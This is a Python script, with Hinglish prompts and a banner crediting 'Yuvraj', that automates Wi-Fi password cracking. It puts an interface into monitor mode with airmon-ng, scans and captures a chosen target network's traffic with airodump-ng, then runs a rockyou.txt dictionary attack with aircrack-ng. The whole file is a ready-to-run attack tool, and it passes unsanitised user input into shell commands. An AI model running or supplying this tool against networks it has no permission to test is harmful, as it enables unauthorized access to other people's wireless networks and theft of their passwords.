import os
import time

ascii_art = r"""
█▀▀██▀▀█ █▀▀▀▀▀▀█ █▀▀████▀▀█ █▀▀█
▓  ▓▓  ▓ ▓  ▓▓  ▓ ▓  ▓▓▓▓  ▓ ▓  ▓
▒  ▒▒  ▒ ▒  ▒▒  ▒ ▒  ▒▒▒▒  ▒ ▒  ▒
░  ░░  ░ ░  ░░  ░ ░  ░░░░  ░ ░  ░
█  ▀▀  █ █  ▀▀  █ █  █  █  █ █  █
▓  ▓▓  ▓ ▓  ▓▓  ▓ ▓  ▓  ▓  ▓ ▓  ▓
▒  ▒▒  ▒ ▒  ▒▒  ▒ ▒  ▒  ▒  ▒ ▒  ▒
░  ░░  ░ ░  ░░  ░ ░  ░  ░  ░ ░  ░
█▄▄██▄▄█ █▄▄██▄▄█ █▄▄▄▄▄▄▄▄█ █▄▄█
"""

# Terminal Colors
CYAN = "\033[1;36m"
RESET = "\033[0m"

# Print Banner
print(CYAN + ascii_art + RESET)
print("*==* By Yuvraj *==*")
print("=================== \n")
print("[!] System ke active interfaces scan kiye ja rahe hain...\n")


os.system("ip -br link show")

print("\n" + "="*40 + "\n")

# Step 2: Interface select karna aur Monitor mode enable karna
interface = input("Upar ki list se apna wireless interface daalo (jaise wlan0): ").strip()

print("\n[!] Conflicting background processes kill kiye ja rahe hain...")
os.system("sudo airmon-ng check kill")

print(f"\n[!] {interface} par monitor mode enable kiya ja raha hai...\n")
os.system(f"sudo airmon-ng start {interface}")

# Note: Modern airmon-ng interface ka naam wahi rakhta hai ya 'mon' add karta hai
mon_interface = input(f"Aapka active monitor interface kya bana? (Default press Enter for {interface}): ").strip()
if not mon_interface:
    mon_interface = interface

print("\n--- MONITOR MODE READY ---")
print(f"[+] Active Monitor Interface: {mon_interface}")

# Step 3: General Wi-Fi Scan
scan_choice = input("\nKya aap aas-pass ke networks scan karna chahte hain? (y/n): ").strip()
if scan_choice.lower() == 'y':
    print("\n[!] Scanning start ho rahi hai... Targeted BSSID aur Channel note kar lein.")
    print("[!] Scan stop karne ke liye 'Ctrl + C' dabayein.\n")
    time.sleep(2)
    try:
        os.system(f"sudo airodump-ng {mon_interface}")
    except KeyboardInterrupt:
        print("\n[!] General scan stop ho gaya.")

print("\n" + "="*40 + "\n")

# Step 4: Specific Target Network Capture
bssid = ""
file_name = ""

target_choice = input("Kya aap kisi specific network/BSSID ka data capture karna chahte hain? (y/n): ").strip()
if target_choice.lower() == 'y':
    bssid = input("Target ka BSSID/MAC address daalein (e.g. AA:BB:CC:DD:EE:FF): ").strip()
    channel = input("Target ka Channel number daalein (e.g. 6): ").strip()
    file_name = input("Output file ka naam daalein (e.g. capture_output): ").strip()
    
    print(f"\n[!] Target ({bssid}) par capture start ho raha hai...")
    print("[!] Capture stop karne ke liye 'Ctrl + C' dabayein.\n")
    time.sleep(2)
    
    cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {file_name} {mon_interface}"
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print("\n[!] Target capture stop ho gaya hai.")

# Step 5: Dictionary Attack / Cracking
print("\n=== DICTIONARY ATTACK ===")
bol = input("Kya aap Dictionary attack (Aircrack-ng) karna chahte ho? (y/n): ").strip()

if bol.lower() == 'y':
    if not bssid or not file_name:
        bssid = input("Target BSSID daalein: ").strip()
        file_name = input("Capture file ka naam (bina .cap ke) daalein: ").strip()

    # Checking rockyou.txt
    if os.path.exists('/usr/share/wordlists/rockyou.txt'):
        print("[+] rockyou.txt pehle se extracted hai!")
    else:
        print("[!] rockyou.txt extract ki ja rahi hai...")
        os.system("sudo gunzip /usr/share/wordlists/rockyou.txt.gz")
        
    print("\n[!] Aircrack-ng ke saath dictionary attack shuru ho raha hai...")
    cap_file = f"{file_name}-01.cap"
    
    # Corrected Command Syntax
    crack_cmd = f"sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b {bssid} {cap_file}"
    os.system(crack_cmd)

# Cleanup / Reset Interface
disable_choice = input(f"\nKya aap {mon_interface} ko wapas normal mode par lana chahte hain? (y/n): ").strip()
if disable_choice.lower() == 'y':
    print(f"\n[!] {mon_interface} stop kiya ja raha hai...")
    os.system(f"sudo airmon-ng stop {mon_interface}")
    
    print("[!] NetworkManager restart kiya ja raha hai...")
    os.system("sudo systemctl restart NetworkManager")
    print("[+] System wapas normal Wi-Fi mode par aa gaya hai!")
else:
    print("\n[+] Script finished successfully!")